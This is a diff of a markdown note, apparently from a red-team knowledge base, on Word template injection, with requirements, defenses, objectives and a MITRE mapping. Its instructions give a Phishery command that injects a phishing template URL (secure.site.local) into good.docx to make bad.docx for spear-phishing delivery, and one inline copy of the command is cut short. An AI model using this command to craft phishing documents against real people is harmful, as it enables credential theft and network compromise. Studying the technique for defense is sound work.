@@ -36,11 +36,15 @@ Technical Explanation: This technique exploits the vulnerability in the way Word
 
 Business Value: This technique can be used by attackers to gain access to sensitive information, steal intellectual property, or disrupt business operations. It can result in financial loss, reputational damage, and legal consequences.
 
+ 
+
 ## Requirements
 
 1. A crafted Word document with a template injection vulnerability
 
 1. A delivery method such as social engineering tactics or spear-phishing emails
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ Business Value: This technique can be used by attackers to gain access to sensit
 
 1. Regularly update and patch software to mitigate vulnerabilities
 
+ 
+
 ## Objectives
 
 1. Deliver a malicious payload to a victim's machine through a crafted Word document
@@ -58,21 +64,33 @@ Business Value: This technique can be used by attackers to gain access to sensit
 
 1. Compromise the target network
 
+ 
+
 # Instructions
 
 1. The Phishery tool is used to inject a Word document with a phishing template. The -u flag specifies the URL of the phishing template, the -i flag specifies the name of the original Word document, and the -o flag specifies the name of the new, injected Word document. Upon running the command, the original document is opened, the phishing template is set, and the injected document is saved.
 
+ 
+
+
+
 **Code**: [[$ phishery -u https://secure.site.local/docs -i go]]
+
+
 
 > -u: The URL of the phishing template.
 -i: The name of the original Word document.
 -o: The name of the new, injected Word document.
+
+
 
 **Command** ([[Phishery - Injecting URL into Word Document]]):
 
 ```bash
 $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -95,3 +113,5 @@ $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 - [[DOCX - Template Injection]]
 - [[Office - Attacks]]
 - [[Template Injections Tools]]
+
+
